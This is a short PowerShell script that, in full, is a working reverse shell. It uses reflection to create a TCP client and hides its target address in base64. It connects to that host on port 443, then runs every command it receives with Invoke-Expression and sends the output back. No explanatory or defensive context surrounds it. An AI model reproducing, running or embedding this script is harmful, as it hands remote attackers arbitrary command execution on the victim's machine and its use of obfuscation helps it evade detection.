
$n = "System.Net.Sockets.TcpClient"
$c = [Ref].Assembly.GetType("System.Net.Sockets.TcpClient")
$client = [Activator]::CreateInstance($c)


$i = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTAuMjExLjU1LjU="))
$p = 443


$m = $c.GetMethod("Connect", [type[]]@([string], [int]))
$m.Invoke($client, @($i, $p))


$s = $client.GetStream()


$buffer = New-Object byte[] 1024
While($true) {
Try {
        $read = $s.Read($buffer, 0, $buffer.Length)
If($read -gt 0) {
            $cmd = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
            
            $out = iex $cmd | out-string
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($out)
            $s.Write($bytes, 0, $bytes.Length)
        }
    } catch { break }
}
